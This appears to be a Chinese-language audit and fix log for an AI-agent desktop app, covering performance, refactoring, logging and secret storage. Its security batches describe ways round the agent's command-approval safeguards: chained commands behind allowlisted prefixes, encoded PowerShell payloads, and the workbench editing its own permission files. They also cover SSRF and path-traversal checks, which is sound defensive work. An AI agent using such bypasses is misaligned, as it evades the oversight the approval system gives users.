- **另**：`dead_code = "allow"`（`Cargo.toml:60`）+ 生产代码 3079 个 `.unwrap()` / 873 个 `.expect(` / 288 处 `unsafe`（`agents` 台账：`focus/embedded/mod.rs` 151、`automation/repository.rs` 86、`tool_call_parser.rs` 76）——`unwrap_used` 只 warn（`:79`），CI 里不可见。
- **方向**：删除已确认无调用点的抽象；`clippy::unwrap_used` 按 crate 逐步升 `deny`（先 top-5 文件）；`dead_code` 先对部分 crate 开 `warn`。

---

## P3 — 打磨项（4 项）

- **P3-1 cron 独立裸 SQLite**：`hermix-cron/src/persistence.rs:186-204`（无 WAL/busy_timeout、每次操作新开连接、async 中同步跑）。并入 P1-14 收口。
- **P3-2 `focus` embedded 单 `Mutex<Connection>` 串行化所有检索**：`hermix-focus/src/embedded/mod.rs:75/97/186/383/453`，async trait 方法内同步执行。改读写分离或 `spawn_blocking`。
- **P3-3 dev 体验**：`vite.config.ts:35` 预打包只列 2 个包（echarts/katex/refractor 靠运行期发现，历史上因此白屏）；`package.json` 的 `dev` 走 cargo+sidecar 全链路。补 `dev:vite` 说明与 `optimizeDeps.entries` 自动扫描。
- **P3-4 配置无热重载、`.env` 每次 load 都 `unsafe set_var`**：`hermix-config/src/loader.rs:59-62`、`:84-86`（`load_config` 在 axum handler 与后台 refresh 里也会被调）；`dashboard/config.rs:110-114`、`free_channel.rs:144-146`/`:179` 每请求重读 YAML。改 `.env` 只在 `main` 加载一次 + `ArcSwap<GatewayConfig>` + `notify` 文件监视。
- **P3-5 OTLP 遥测链路构造上不可能生效**：`hermix-telemetry/src/log_manager.rs:646-659`（第二个 registry 再 `try_init` 必然 Err，被 `let _ =` 吞），且 `otlp` feature 无任何构建脚本启用。要么接进同一 registry，要么删掉这条假链路。

---

## 正面记录（不要回退）

审查中确认**已经做对**、后续优化不应破坏的部分：

- 传输层 `apiInvoke` 已有超时 + `AbortSignal.any`（`api/rest.ts:105-143`）；缺的只是调用点使用。
- 路由级 `lazy()` 已生效（`app/routes.tsx:10-16`），重型视图各有独立 chunk；mermaid 已动态 `import()`（`MarkdownBody.tsx:545-547`）。
- `MarkdownBody`/`CodeBlock`/`MessageBubble` 已 memo（`MarkdownBody.tsx:416/784`、`MessageList.tsx:93`）；流式 chunk 已 rAF 合批（`useStreamChat.ts:577-587`）。
- 默认只监听 `127.0.0.1:3000`（`hermix-server/src/main.rs:105`）；CORS 只回显本机来源（`lib.rs:272-313`）；配对 token 用常量时间比较（`security.rs:275-288`）；WS 握手 Bearer+签名（`mobile_ws.rs:34`）。
- `hermix-session/src/sqlite_sink.rs:46-87` 的批量 INSERT + 单事务，是存储层最正确的范本，可作为 P1-14 收口的参照。
- 使用 `block_in_place`/`spawn_blocking` 的意图已存在（28/52 处），说明"不能阻塞 runtime"的认知已在，缺的是统一入口（`registry.rs:82-86` 的 12 处 `block_in_place` 反而把 worker 变成阻塞线程，应改为 async 派发）。
- 前端显式 `any` 只有 11 处；`tsc --noEmit` 与 `check-design*` 门禁体系完备。

---

## Alternatives considered

1. **只修 P0、跳过性能**：被否。P1-1/P1-2/P1-3 是"越用越慢"的直接原因，且 P1-1 与 P1-11 是同一处代码（合并双循环时顺带解决拷贝），拆开做反而要改两遍。
2. **先做架构拆分（P1-13）再修性能**：被否。先拆文件不减少耦合（P1-13 的佐证正是"文件已经拆过一次仍然重复"），必须先把 `apply_approval_response` / `prepare_turn` 抽成单一实现，拆分才有意义。
3. **引入 React Query / 虚拟列表库**：暂缓到 P2-4/P1-5 落地时评估。当前依赖纪律（六步阶梯）要求先用平台/标准能力；`useSyncExternalStore` + 自建缓存键足够覆盖现有轮询面，先不新增依赖。
4. **重定代码规模目标（10 万行）**：本条只提出事实（实测 34 万行），不替用户改目标。删测/删死代码能回收的只是一小部分，真正的量在 `local_agent_service`/`ws`/工具后端这类平铺实现上——若目标保留，必须先决定"哪些能力砍掉"，那是产品决策，不是重构。
5. **把 P0-2 直接改成"编码命令一律审批"**：被否。这违背 2026-09-26 的用户裁决（编码本身不弹卡，会造成大量误报）。正确修法是只解码检查内容，保持"编码不审批"的 UX。

## Consequences

- **正面**：P0 八项修复后，"一次点击授权任意链式命令""工作台自改审批白名单""编码命令绕过删除审批""会话被空历史覆盖""中文输出 panic"这些**不可逆或可利用**的风险消失；P1 前六项完成后，长会话流式延迟与首屏启动耗时有可测量的下降（预期每轮少 3~5 次全量拷贝、首屏 JS 降 60% 以上）。
- **负面/代价**：
  - P1-11（合并双循环）与 P1-13（抽函数 + 拆文件）都是**高冲突改动**，需要冻结并行会话对 `run_loop.rs`/`ws.rs`/`App.tsx` 的修改，否则合并成本高于收益。
  - P1-8 的索引与迁移守卫涉及磁盘 schema，必须带"旧库升级 + 回滚"验证；`ensure_db` 加 `OnceCell` 后，**进程内 schema 变更不再自动生效**——所有未来迁移必须走"版本号变更 + 重启"，这条要写进贡献约定。
  - P0-8 密钥迁入 vault 会让"手改 config.yaml 填 key"失效，需要同步更新设置页与文档，否则用户会认为配置不生效。
  - P2-10 的依赖统一（reqwest 0.13）会牵动 tauri 与 chromiumoxide 两条线，需要一次完整回归；不做的话，注释与事实不符会持续误导后来者。
- **验证基线**：每批改动后仍须 `cargo check --workspace --all-targets` 零错误零警告 + `cargo test --workspace --lib --exclude hermix-environments --exclude hermix-viewer` 全绿 + `node_modules/.bin/tsc --noEmit` + `./scripts/ci-gate.sh`（含 `check-design*`/`check-notes`）。

## 执行记录

### 批次 1（P0）— 2026-10-25 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P0-1 白名单链式降级 | `approval/engine.rs` 新增 `has_command_chaining` + `strip_quoted`（引号内分隔符不算链式），user allowlist 降级只对单一命令生效；`approval/allowlist.rs::extract_trust_signature` 对链式命令返回 `None`（不生成前缀签名） | `prefix_allowlist_entry_cannot_launder_chained_commands`、`quoted_separators_do_not_disable_the_allowlist`、`chained_command_gets_no_allowlist_signature` |
| P0-2 编码命令载荷 | 新增 `approval/encoded.rs`（`-EncodedCommand`/`-enc`/`-ec`/`-en`，支持 `:`/`=` 与下一 token 两种写法；base64→UTF-16LE，失败回退 UTF-8）。`check_approval` 与 `check_approval_for_origin_with_scopes` 都解码后重跑 DENIED（硬拒）/ confirm（强制确认），且只读分支不得把它洗白 | `encoded_powershell_denied_payload_is_denied_not_prompted`、`encoded_powershell_benign_payload_stays_approved` + `encoded.rs` 4 项 |
| P0-3 工作台越权写 | `hermix_core::path_security` 新增 `HERMIX_PERMISSION_CONFIG_NAMES` + `is_permission_config_name`（单一真相源，解 `tools → plugin` 的反向依赖）；`plugin/workbench_gateway.rs::is_out_of_scope` 接入该名单 + app home 下的 `config.yaml`；`tools/permission_guard.rs` 改为引用同一常量 | `permission_governing_files_are_out_of_scope` |
| P0-4 agents 路径穿越 | `dashboard/agents.rs` 新增 `validate_agent_id`（字母/数字/`-`/`_`，≤128），写与删两处都校验 | `agent_id_rejects_path_fragments` |
| P0-5 空历史覆盖 | `local_agent_service.rs` 的 `send_message` / `send_message_stream` 读失败改为传播 Err（不再 `unwrap_or_default`）；`reset_session` 的读/写失败同样传播 | agent 1187 全绿 |
| P0-6 UTF-8 截断 panic | 新增 `hermix-environments/src/output.rs`（`truncate_to_boundary` / `truncate_bytes_to_boundary`），local（PTY 与普通路径）、ssh、docker、local_isolation 五处统一接入 | `output::tests` 3 项 |
| P0-7 出站 SSRF | `server/util.rs` 新增 `safe_outbound_url`（仅 http/https + 云元数据端点黑名单）与 `safe_redirect_policy`（逐跳复查）；`custom_providers.rs` 的 `test_inline` / `fetch_models` / `test_connection` 三处接入 | `云元数据端点被拒`、`出站地址只允许_http_https` |
| P0-8 明文密钥 | **两层**。① ACL：`config/loader.rs::write_yaml_atomic` 写盘后 `icacls /inheritance:r` 只授当前用户 + `*S-1-5-32-544`（Administrators）+ `*S-1-5-18`（SYSTEM），失败仅 warn。② 托管：`hermix-config/src/secrets.rs` 新增 `SecretStore` 端口 + `seal`/`unseal`（YAML 与 JSON 两种形态，JSON 版给 `/api/config` 的 Value 合并路径用，保留未知字段）；`save_config_yaml` 保存前封存、`load_config`/`load_from_yaml` 加载后还原；`hermix-server/src/secret_store.rs` 把端口接到 vault（**惰性打开**，`run_server_with_tls` 注册，覆盖 sidecar/CLI 全部入口）。**依赖环用端口倒置绕开**：config 只定义 trait，vault 实现在 server（server 本来就同时依赖两者），vault crate 一行未改 | config 144、server 498 全绿 |

批次 1 顺带修复的两处：

- **只读词洗白链式命令**（`sudo apt install foo; ls` 曾因尾部 `ls` 整条 Approved）：`READONLY_PATTERNS` 是整串匹配，现在只对单一命令生效；全只读的链式组合仍因"无 confirm 命中"放行。回归见 `readonly_word_in_chained_command_does_not_whitelist_it`。
- **workspace 零警告基线恢复**：`member/runner.rs` 两处多余 `mut`、`server/test_state.rs` 两处未使用 import（均为既有告警）。

**验证**：`cargo check --workspace --all-targets` 零错误零警告；`hermix-tools` 808、`hermix-agent` 1187、`hermix-server` 498、`hermix-config` 144、`hermix-plugin` 4 全绿。

### 批次 2（后端性能）— 2026-10-25 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P1-8.1 `ensure_db` 每条路径重跑迁移 | `session_persistence/schema.rs`：`ensure_db` 改为**进程内按 db 路径去重**的守卫（原实现改名 `ensure_db_inner`）。此前每个请求都白付 ~14 条 `ALTER TABLE` + 建表批次 + 9 次 `stamp_migration` + 一次 `DELETE FROM messages WHERE role='system'` 全表扫 | agent 1187 全绿 |
| P1-8.2 时间列无索引 | 同文件建表批次补 `idx_messages_created_at`、`idx_sessions_updated_at`（旧库靠 `CREATE INDEX IF NOT EXISTS` 补齐） | 同上 |
| P1-10 glob 每文件编译一次正则 | `backends/file.rs::matches_glob` 加按 pattern 文本的编译缓存（容量 8，命中在首位）。10 万文件搜索此前 = 10 万次 `Regex::new` | tools 808 全绿 |
| P1-8.3 handler 里同步跑 SQLite | `routes.rs::list_sessions` 拆出 `read_session_summaries` 并 `spawn_blocking`；`dashboard/analytics.rs::get_usage` 的 `aggregate_usage`（9+ 查询，含整表 JSON 解析）同样搬进阻塞池 | server 498 全绿 |
| P1-9 每轮复制含密钥的配置 | `gateway_token_warn` 不再 `cfg.llm_providers.clone()`：改为锁内直接调 `get_model_context_length_with(&cfg.llm_providers)`，只带出 `u64` 上下文长度 | agent 1187 全绿 |
| P3-1 cron 裸 SQLite | `hermix-cron` 加 `hermix-store` 依赖，`open_connection` 改走 `hermix_store::open_connection(Write)`（WAL + busy_timeout 与其他库一致；裸 open 是 journal_mode 漂移与并发 tick `SQLITE_BUSY` 的来源） | cron 39 全绿 |
| P2-10 无用 workspace 依赖 | `Cargo.toml` 删 `clap`/`ratatui`/`crossterm`（24 个 member 零引用，唯一使用者 `apps/hx-packager` 非 workspace 成员） | workspace check 零警告 |

### 批次 4（深拷贝与重复实现）— 2026-10-26 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P1-1 每轮历史深拷贝 | 三处：① `local_agent_service` 的 `send_message` / `send_message_stream` 由 `messages.clone()` 改 `std::mem::take`（循环拿到所有权，回程本来就用 `AgentResult.messages` 覆盖）；② `sanitize_messages_for_strict_api` 里 `drop_orphan_tool_results` 由「`&[Message]` → 新建 `Vec<Message>`（`.cloned()`）」改**就地 `retain`**，省掉每条消息（含工具结果正文）的一次深拷贝 | agent 1187、provider 56 全绿 |
| P2-6 两份装配实现 | `assemble_tool_schemas(all)` 改为委托 `assemble_tool_schemas_with_meta(all, &ToolMetaRegistry::new())`（空表时它本来就回退到 `classify_tools`）。删掉 32 行重复的「拆 bridge → 判阈值 → 注入三元组」，那两份注释此前在互相镜像修同一个 bug | tools 808 全绿 |

### 批次 11（P1-9 技能扫描缓存）— 2026-10-26 交付

**先量后改**：新增探针 `skill_loader::tests::probe_scan_cost`（`#[ignore]`），实测 `with_dir + scan()`：

```
30 个技能、50 次取均值、debug 构建：单次 25.56 ms
```

`pre_turn` 每轮都跑一次，且是同步阻塞在 async 路径上。这个量级足以支撑一次缓存设计。

落地 `skill_loader::cached_loader(dir) -> Arc<SkillLoader>`，缓存键 = **目录 mtime + 条目数**指纹 + **60s TTL**。三条失效路径分别是：

| 用户动作 | 生效时机 |
|---|---|
| 增 / 删技能目录 | 立即（指纹变） |
| 改 `SKILL.md` 正文 | **立即**（`load_body` 每次匹配后重新读盘，正文从不过缓存） |
| 改 frontmatter（描述/标签/allowed-tools） | 最多 60s |

只有第三条是代价。用户改技能绝大多数是改正文，用"每轮 25ms"换"元数据最多延迟一分钟"是划算的。

`run_loop::build_active_skills_block_with_tools` 改用缓存版本。回归：`cached_loader_reuses_and_invalidates_on_new_skill`（同目录 `Arc::ptr_eq` 命中；新增技能目录必须重扫且新技能可匹配）。

验证：agent **1194 全绿**（+1 缓存测试，+1 ignored 探针）。

### 批次 10（P2-9 限流键）— 2026-10-26 交付

`server/security.rs::client_key` 由 `SocketAddr::to_string()`（`IP:源端口`）改为**纯 IP**。原实现的两个后果：

- 每个新 TCP 连接拿到全新限流额度 → 暴力破解锁定永不触发（`AuthFailLockout` 也吃同一个键）；
- `RateLimiter` 的 `HashMap` 键集合随连接数单调增长，只在同名命中时才清时间戳 → 内存无界。

配套两点：

1. **锁定的 loopback 豁免**（`lockout_applies`）：本机进程本来就能直读 `~/.hermix/` 下的密钥与配对凭据，锁定挡不住它，只会在用户自己输错几次 key 后把他锁在外面 15 分钟。远程来源（PairedDevice / 手机）仍然锁。
2. **限流表容量上限** `MAX_TRACKED_KEYS = 4096`：超限先清窗口外条目，仍超就整体清空（限流是尽力而为，内存不能无界）。

验证：`cargo test -p hermix-server --lib` **504 全绿**（+2 新测试：`lockout_skips_loopback_only`、`rate_limiter_table_is_bounded`）。

### 批次 9（巨石拆分，P1-13 第一刀）— 2026-10-26 交付

`crates/hermix-agent/src/local_agent_service.rs`（5653 行）改为模块目录，第一刀搬出**纯函数**：

| 文件 | 内容 |
|---|---|
| `local_agent_service/mod.rs` | 组合根（**5036 行**，−617） |
| `local_agent_service/messages.rs` | `strip_transient_nudges` / `merge_consecutive_assistant_messages` / `with_attached_files_note`（无 IO、无 `self`） |
| `local_agent_service/reply_fallback.rs` | `summarize_tool_results_for_empty_reply`（110 行，输入只有 `&[Message]`） |
| `local_agent_service/prefetch_adapter.rs` | `SafeRegistryWrapper`（33 行，`Arc<ToolRegistry>` → prefetch `SafeToolRegistry` 桥接） |
| `local_agent_service/config_resolve.rs` | `resolve_workspace` / `apply_overrides` / `inject_thinking_directive` / `looks_like_openrouter` / `default_permission`（182 行，全是无 `self` 的关联函数） |
| `local_agent_service/turn_registry.rs` | `TurnOutcome` + `signal_interrupt` / `take_steer_buffer` + `interrupt_session` / `steer_session` / `register_active` / `unregister_active` / `begin_turn_record` / `end_turn_record` / `interrupt_all`（206 行） |

**第五刀的可见性要点**：这批是 `impl LocalAgentService` 的方法，但字段是父模块私有的 —— Rust 里子模块**可以**访问父模块私有字段，所以搬家不需要放宽任何字段可见性；只有方法本身要补 `pub(super)`（`interrupt_session` / `steer_session` 原本就是 `pub`，对外签名不变）。

搬移零行为变化（函数体逐字照搬，只加 `pub(super)` 与模块 import），并给两个函数补了单测（空 assistant 丢弃与合并、附件后缀只在有文件时追加）。验证：agent **1190 全绿**（+2 新测试）。

**后续拆分顺序**（按耦合度从低到高，不建议跳步）：

1. ~~`SafeRegistryWrapper` + prefetch 适配~~ **已做**（`prefetch_adapter.rs`）
2. ~~`summarize_tool_results_for_empty_reply`~~ **已做**（`reply_fallback.rs`）
3. ~~`resolve_workspace` / `apply_overrides` / `inject_thinking_directive` / `looks_like_openrouter` / `default_permission`~~ **已做**（`config_resolve.rs`）
4. ~~`register_active` / `unregister_active` / `begin_turn_record` / `end_turn_record` / `interrupt_*` / `steer_*` + `TurnOutcome`~~ **已做**（`turn_registry.rs`）
5. `spawn_agent_loop`（290 行）+ `build_agent_config` 装配 → `assembler.rs`（依赖最多，最后做）

**为什么不在这一轮全做完**：3/4/5 各自要动共享状态（`Arc<Mutex<...>>` 注册表、`AgentLoop` 装配参数），一旦搬错就是运行期行为差异，而不是编译错误。1/2 是纯函数，可以继续按同样方式推进；3 之后再往下必须先补"装配结果快照"测试。

### 批次 8（双循环合并，P1-11 第一刀）— 2026-10-26 交付

新增 `crates/hermix-agent/src/run_loop/tool_prep.rs`（190 行），把两条主循环里逐字重复的 **tool-call 前置处理**抽成单一实现：

```
去重 → 未知工具名修补 → session_search 参数水合 → before_validate 钩子
→ 统一校验（AL-7）→ 状态提示 → apply_outcome
→ 进化计数器 → delegate 上限 → PreToolCall 钩子 + clarify 回调 → 中断检查
```

返回三态 `ToolPrep::{Proceed, SkipTurn, Abort}`：`SkipTurn` 对应原来的 `continue`，`Abort` 携带已经构造好的 `AgentResult`（校验耗尽 / 用户中断）。

| 指标 | 前 | 后 |
|---|---|---|
| `run_loop.rs` | 1918 行 | **1730 行** |
| 同一逻辑的实现份数 | 2（125 + 121 行，已分叉） | **1** |
| 流式独有逻辑 | 内联在重复段中间 | 通过 `before_validate` 钩子注入（历史顺序不变：去重之后、校验之前） |

**一处差异被保留而不是"修掉"**：`finalize_agent_result` 的 `finish_reason`，`run()` 传 `None`、`run_stream()` 传 `last_finish_reason`。抽取后它变成一个显式参数——两条路径仍各自传各自的值。统一它会改变 `run()` 的既有输出，属于独立的行为决策，不在这次重构里夹带。

验证：`cargo test -p hermix-agent --lib` **1188 全绿**（`agent_loop/tests.rs` 里覆盖校验耗尽、中断、invalid tool 的用例都走这两条路径）；`cargo check --workspace --all-targets` 零错误零警告。

**剩下的双循环债务**（未做）：watchdog 装配、`LoopState` 初始化、inner retry loop、fatal 分支仍是两份。它们与 transport 强耦合（流式的 `on_chunk` / `stream_mute` / `last_finish_reason` 贯穿），下一刀应先抽 `TurnBudget`（deadline + JoinHandle 登记），再合并外层。

### 批次 7（前端错误可见性）— 2026-10-26 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P2-3 基础设施 | 新增 `apps/desktop-tauri/src-tauri/src/frontend_log.rs`：`report_frontend_error(scope, message)` 命令，写 `<hermix_home>/logs/frontend.log`（epoch 秒 + scope + message），单文件 4 MB 轮转一次。**走 IPC 而不是后端 HTTP**：一半要上报的场景是"后端离线"，走 HTTP 会二次失败 | `cargo check -p hermix-desktop` 通过 |
| P2-3 前端封装 | 新增 `src/lib/reportError.ts`：`console.warn`（dev 可见）+ `invoke`（release 唯一载体，`drop_console` 会删掉 console）。非 Tauri 环境（单测/预览）静默跳过 | tsc 通过 |
| P2-3 收敛空 catch | **55 处 → 0**。手工收敛 36 处（`useExpert` 15、`App.tsx` 6、`ModelSelector` 4、`useAppBootstrap` 3、`bubbleUtils` 3、`agents/storage` 2、`settingsUtils` 2、`reportError.ts` 自身 1），一次性脚本收敛 19 处（`useTheme` 3、`useStreamParser` 2、`useSendKey` 2、`BackendSettingsTab` 2、`rest.ts`/`useDesktopNotify`/`useExpertCutoff`/`uiScale`/`Sidebar`/`ToolEventCard`/`UserMenuPopover`/`AutomationView`/`TestDialog`/`AdvancedSettingsTab` 各 1） | tsc 通过 |
| P2-3 日志入口 | 不需要额外改动：`commands::list_backend_log_files` 扫描的是整个 `logs/` 目录，`frontend.log` 自动出现在设置 → 诊断的日志列表里 | — |

**踩到的坑（已修）**：前端日志最初写到 `hermix_config::paths::hermix_home()/logs`，而桌面端日志查看器读的是 `commands::resolve_data_dir()/logs`。两者在便携模式（`HERMIX_PORTABLE_DATA_DIR`）与 `hermix-data` 开发模式下**不是同一个目录** —— 日志会写到用户永远看不到的地方。现在统一用 `resolve_data_dir()`。

**脚本化的教训**：批量替换 `catch {}` 时，import 注入点若取「第一个 `import` 行之后」，遇到多行 import（`import {\n  A,\n  B\n} from …`）会把新 import 插进花括号中间，直接把两个文件写坏（tsc 立刻报 TS1003）。批量脚本必须按「import 语句整体」定位，不能按行。

### 批次 6（长会话加载）— 2026-10-26 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P1-7 会话列表无界 | `routes.rs::read_session_summaries` 加 `LIMIT 1000`，`total` 改真实 `COUNT(*)`（此前用 `sessions.len()` 顶替，加 LIMIT 后会变成"最多 1000"这个假数字）。保留 `{…_SCOPE_SQL}` 插值形态 —— 仓库有一条测试钉这个形状，防止过滤条件被硬编码绕过常量 | server 498 全绿 |
| P1-7 消息读取 O(N) | 新增 `SessionPersistence::load_session_tail_with_timestamps(session_id, limit)`：子查询 `ORDER BY id DESC LIMIT ?` 外层再 `ORDER BY id ASC`，返回顺序与全量版一致。行解析抽成 `session_entry_from_row` 供两版共用（列序漂移会让时间戳错行，正是"每条消息都显示刚刚"那个 bug）。`get_session_messages` 按 `(limit + tail_skip) * 4 + 40` 只读尾部；首屏（`tail_skip == 0`）跳过压缩归档子会话的内容读取（它们拼在窗口之前，窗口里一条都用不上），并用 `has_more \|\|= !child_ids.is_empty()` 保证「加载更早」入口仍在 | server 498、agent 1188（含新测试） |

**P1-7 的原描述要修正**：前端**早已**窗口化（`INITIAL_MESSAGE_WINDOW = 60` + `tail_skip` 翻页 + `has_more`，`App.tsx:1329` 首屏就传了 limit）。真正的浪费在服务端 —— 窗口切在内存里，DB 仍全量读。上面的改动把读取量也降到窗口量级。

### 批次 5（可观测性）— 2026-10-26 交付

| 项 | 落地 | 验证 |
|---|---|---|
| P2-7 的一半：日志静默丢失 | `hermix-telemetry/src/log_manager.rs`：`try_lock` 失败不再静默丢弃 —— 计入 `DROPPED_RECORDS`，下次抢到锁时补写一行 `[log] N record(s) dropped`；`w.write/flush` 失败计入 `WRITE_FAILURES` 并每 100 次报一次 stderr | telemetry 12 全绿 |

排障语义因此变成：日志里没有某条 = 没发生；日志里有 `dropped` 行 = 发生过但写盘被丢了。此前两种情况无法区分。

**P1-1 的剩余部分没有做，且核实后发现原估偏高**：`sanitize_messages_for_strict_api` 的入参是 `&[Message]`（trait 方法签名决定），一次 `to_vec()` 不可避免；三 pass 中后两个（`enforce_strict_tool_pairing`、`merge_adjacent_assistant_messages`）本来就是消费式（move 进出，不 clone）。所以真实成本是 **2 次**全量拷贝（`to_vec` + `local_agent_service` 的 `clone`）而不是 3~5 次，上面两处已各消除一次的一半。再往下要动 `ToolRegistry::get_definitions()` 的返回类型（`Vec<ToolSchema>` → `Vec<Arc<ToolSchema>>`），跨 trait 边界，单独评估。

### 批次 3（前端产物体积 / 渲染优先级）— 2026-10-25 交付

| 项 | 落地 | 实测 |
|---|---|---|
| P1-6 vendor 拆分 | `vite.config.ts` 加 `manualChunks`：react / echarts / katex / refractor 各自成 chunk | **App chunk 1.71 MB → 1.01 MB（−41%）**；routes 567 KB → 310 KB |
| P1-6 echarts 移出首屏 | `SettingsShell` 里 `MemoryTab` 改 `lazy()` + `Suspense`（它是唯一把 echarts 拖进依赖图的设置页） | `vendor-echarts` 466 KB 只在切到「记忆管理」时加载 |
| P1-4 流式解析优先级 | `MarkdownBody` 的解析管线改读 `deferredContent`（`useDeferredValue` 叠在既有 120ms 节流之上），解析不再抢占输入/滚动 | tsc 通过 |

### 本轮**未做**的项与理由（留给后续批次）

| 项 | 为什么不做 |
|---|---|
| P1-11 `run`/`run_stream` 合并双循环 | 高风险：两条循环 + 20 处调用点，改错会让 finish_reason / 中断语义静默漂移。要单独一批 + 完整 WS 回归 |
| P1-13 拆分三个巨石文件 | 先抽 `apply_approval_response` / `prepare_turn` 再谈拆；只拆文件不减少耦合（`ws.rs` 已经拆过一次仍重复） |
| P1-1 剩余的 `to_vec` | 入参 `&[Message]` 由 trait 签名决定；再往下要改 `get_definitions()` 的返回类型（见批次 4 说明） |
| P1-2 工具 schema 缓存 | 缓存失效条件（工具集版本 / 配置 / 可用性）判断错会让模型看到过期工具列表 —— 静默错，代价高于收益 |
| P1-3 前端流式 store 化 | 需要把 `App.tsx` 的 41 处 `setSessions` 收敛到独立 store，属 P1-13 同级别改动 |
| P1-5 虚拟列表 | `virtua` 已在依赖里，但接入需要先解决"流式气泡高度变化 + 滚动锚定"，单独一批 |
| P2-7 日志非阻塞写盘 | 改动会波及"日志丢不丢"这一排障基础设施，需要先有端到端日志完整性验证 |
| P1-10 剩余（`read_file` 全量读、web 正则） | `read_file` 的流式读取要扩 `Fs` trait，影响所有 fs 实现；web 正则收益是微秒级 |

### 审查结论的两处事实修正（2026-10-25）

- **P1-5「依赖里没有虚拟列表库」是错的**：`virtua@0.52.10` 已在依赖树里（`MessageList` 未使用）。做 P1-5 不需要新增依赖。
- **P1-4 的「每个 chunk 全量重解析」不准确**：`MarkdownBody` 早有 120ms trailing-edge 节流（`MARKDOWN_REPARSE_THROTTLE_MS`），真实成本是「每 120ms 一次 O(n) 解析」而非每 chunk。基线里该条已按此措辞记录。

### P0-8 密钥托管的落地形状（拍板 A，2026-10-25）

- **写入**：`save_config_yaml` 里 `seal()` 把明文 `api_key` 交给托管实现，字段替换成 `vault:llm_providers.<id>`。托管不可用（vault 打不开 / CredMan 拒绝）→ **保持明文 + 一条 warn**，保存照常成功。
- **读取**：`load_config` 与 `load_from_yaml` 里 `unseal()` 把引用换回明文。取不到明文时（槽位缺失 / 托管未启用 / 打开失败）把该 provider 的 `api_key` 置 `None` 并记 error —— **fail closed**，绝不把 `vault:...` 当密钥发给上游。
- **为什么是端口而不是直接依赖**：`hermix-vault` 依赖 `hermix-config`（`hermix_home`）。让 config 反向依赖 vault 会成环；端口放 config、实现放 server 两条依赖都是单向的。
- **迁移是惰性的**：已有明文 `config.yaml` 在**下一次保存**时自动迁移成引用，启动时不做写操作（避免启动即写盘）。因此「从不改配置」的用户，明文 key 会一直留到第一次保存为止 —— ACL 收紧同样只在写盘时生效。这条是已知边界，若要"启动即迁移"需另加一次显式迁移步骤。
- **降级语义的两面**：写入侧降级（A 的拍板），读取侧不放行（避免把引用串当密钥）。二者不矛盾：前者保证用户能改配置，后者保证配置里出现的引用不会被误用。
